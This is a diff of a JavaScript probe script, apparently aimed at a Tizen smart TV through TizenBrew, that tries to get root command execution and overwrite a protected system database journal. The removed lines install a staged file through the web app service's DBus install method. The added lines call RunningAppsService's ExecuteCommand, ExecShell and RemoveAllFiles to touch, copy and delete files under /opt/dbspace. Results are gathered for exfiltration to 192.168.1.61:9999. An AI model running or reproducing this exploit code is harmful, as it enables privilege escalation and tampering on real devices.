@@ -1,31 +1,19 @@
 "use strict";
 
-/* p77: placement experiments (modulo TizenBrew, uid owner)
-   1. id/groups + staged md5 + live/journal state
-   2. cp diretto (atteso: Permission denied, da documentare)
-   3. WAS was_install_app install_path="/opt/dbspace" (Probe12.wgt, 60s wait)
-      -> ls /opt/dbspace + /opt/usr/apps (nuovi dir? file?)
-   4. WAS install_path="/opt/dbspace/.app-context" (test 2, 60s wait)
-   5. dir writability: temp/common/webappservice/owner home
-   6. WAS DB: ls -la + sqlite probe (file owner:users, scrivibile)
-   exfil /p77info
- */
-
+/* p77 v2: RunningAppsService DBus root commands */
 var cp = null;
 try { cp = require('child_process'); } catch (e) {}
 
-var HOST = '192.168.1.62';
+var HOST = '192.168.1.61';
 var PORT = 9999;
 var STAGED = '/home/owner/share/tmp/sdk_tools/appctx_hot_journal';
-var WGT = '/home/owner/share/tmp/sdk_tools/Probe12.wgt';
-var WGT_MD5 = '207d3f7f8fd57227ece8eccf8215ca2f';
-var APP12 = 'ProbeTwelio.Probe12';
+var DOTAPP = '/home/owner/share/tmp/sdk_tools/dotapp';
 var DST = '/opt/dbspace/.app-context.db-journal';
 var LIVE = '/opt/dbspace/.app-context.db';
-var WAS = 'org.tizen.tv.webappservice.server';
-var WAS_PATH = '/org/tizen/tv/webappservice/server';
-var WAS_IFACE = 'org.tizen.tv.webappservice.server.interface';
-var R = { ts: new Date().toISOString(), probe: 'p77', results: {}, log: [] };
+var RAS = 'com.native.RunningAppsServiceDBUS';
+var RAS_PATH = '/com/native/RunningAppsServiceDBUS';
+var RAS_IFACE = 'com.native.RunningApps_DBUS';
+var R = { ts: new Date().toISOString(), probe: 'p77v2', results: {}, log: [] };
 var posted = false;
 
 function L(s) { R.log.push(String(s).substring(0, 500)); }
@@ -70,57 +58,32 @@ function run(cmd, timeoutMs, maxLen) {
   }
 }
 
-function sleepSync(ms) {
-  try { cp.execSync('sleep ' + Math.ceil(ms / 1000), { timeout: ms + 30000, maxBuffer: 4096 }); } catch (e) {}
-}
+function md5(p) { return run('md5sum ' + p + ' 2>&1; ls -la ' + p + ' 2>&1', 15000, 2000); }
 
-function md5(p) {
-  return run('md5sum ' + p + ' 2>&1; ls -la ' + p + ' 2>&1', 15000, 2000);
-}
-
-function wasInstall(installPath) {
-  return run('dbus-send --system --print-reply --dest=' + WAS + ' --type=method_call ' + WAS_PATH + ' ' + WAS_IFACE + '.was_install_app int32:0 string:"p77" int32:0 int32:0 string:"' + APP12 + '" string:"' + WGT + '" string:"' + installPath + '" int32:0 int32:0 int32:0 string:"p77-install" 2>&1 | head -12', 60000);
-}
-
-function dbspaceCheck(label) {
-  return run('echo ===' + label + '; ls -la /opt/dbspace/ 2>&1 | grep -iE "probe|app-context|total" | head -12; echo ===APPS; ls /opt/usr/apps/ 2>&1 | grep -iE "probe|xvvl" | head -8; echo ===DST; md5sum ' + DST + ' 2>&1', 20000);
+function dbusCall(method, args) {
+  return run('dbus-send --system --print-reply --dest=' + RAS + ' ' + RAS_PATH + ' ' + RAS_IFACE + '.' + method + ' ' + args + ' 2>&1', 30000, 2000);
 }
 
 function main() {
   R.results.s0_id = run('id; whoami; groups 2>&1', 10000, 500);
   R.results.s1_staged = md5(STAGED);
-  R.results.s1b_wgt = md5(WGT);
   R.results.s1c_live = md5(LIVE);
   R.results.s1d_jrn = md5(DST);
   L('init: staged=' + R.results.s1_staged.substring(0, 80));
 
-  /* 2. cp diretto */
-  R.results.s2_cp = run('cp ' + STAGED + ' ' + DST + ' 2>&1 && echo CP_OK || echo CP_FAIL', 20000);
-  L('cp: ' + R.results.s2_cp.substring(0, 150));
+  R.results.i0 = run('dbus-send --system --print-reply --dest=' + RAS + ' ' + RAS_PATH + ' org.freedesktop.DBus.Introspectable.Introspect 2>&1', 30000, 4000);
+  L('introspect: ' + R.results.i0.substring(0, 200));
 
-  /* 3. WAS install_path=/opt/dbspace */
-  R.results.s3_was1 = wasInstall('/opt/dbspace');
-  L('was1 sent: ' + R.results.s3_was1.substring(0, 200));
-  sleepSync(60000);
-  R.results.s4_state1 = dbspaceCheck('AFTER_WAS1');
+  R.results.e1 = dbusCall('ExecuteCommand', 'string:"touch /opt/dbspace/p77test"');
+  R.results.e2 = dbusCall('ExecuteCommand', 'string:"/bin/touch" string:"/opt/dbspace/p77test2"');
+  R.results.e3 = dbusCall('ExecuteCommand', 'string:"cp" string:"' + STAGED + '" string:"' + DST + '"');
+  R.results.e4 = dbusCall('ExecuteCommand', 'string:"rm -f /opt/dbspace/.app-context.db-journal"');
+  R.results.e5 = dbusCall('RemoveAllFiles', 'string:"/opt/dbspace/.app-context.db-journal"');
+  R.results.e6 = dbusCall('ExecShell', 'string:"touch /opt/dbspace/p77test3"');
 
-  /* 4. WAS install_path=/opt/dbspace/.app-context */
-  R.results.s5_was2 = wasInstall('/opt/dbspace/.app-context');
-  sleepSync(60000);
-  R.results.s6_state2 = dbspaceCheck('AFTER_WAS2');
-
-  /* 5. dir writability */
-  R.results.s7_writetest = run(
-    'for d in /opt/share/webappservice/temp /opt/share/webappservice/common /opt/usr/apps/webappservice /opt/usr/home/owner /home/owner/share/tmp/sdk_tools /opt/usr/home/owner/apps_rw; do' +
-    ' T=$d/.p77test_$$;' +
-    ' if touch "$T" 2>/dev/null; then echo "WRITABLE: $d"; rm -f "$T"; else echo "NOT: $d"; fi;' +
-    ' done', 30000);
-
-  /* 6. WAS DB state */
-  R.results.s8_wasdb = run('ls -la /opt/dbspace/.webappservice.db* /opt/usr/apps/webappservice/wasdb_backup/ 2>&1 | head -12; echo ===; stat -c "%a %U:%G %n" /opt/dbspace/.webappservice.db /opt/dbspace/.webappservice.db-journal 2>&1', 15000);
-
-  /* stato finale */
-  R.results.s9_final = dbspaceCheck('FINAL');
+  R.results.s2_ls = run('ls -la /opt/dbspace/ 2>&1 | head -30', 15000, 3000);
+  R.results.s3_jrn = md5(DST);
+  R.results.s3_live = md5(LIVE);
 
   R.results.final = 'done ' + new Date().toISOString();
   L('done');
